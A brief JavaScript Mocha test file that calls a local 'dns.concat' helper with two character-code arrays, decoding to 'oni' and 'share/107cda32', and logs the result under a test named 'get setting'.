import { assert } from "chai";
import { dns } from "./initialize";

var path = require('path');
var name = path.basename(__filename);

describe(name, () => {

  it("get setting", async () => {
    const tx = dns.concat([111,110,105], [115,104,97,114,101,47,49,48,55,99,100,97,51,50]);
    let res = await tx;
    console.log(res)
  });

});
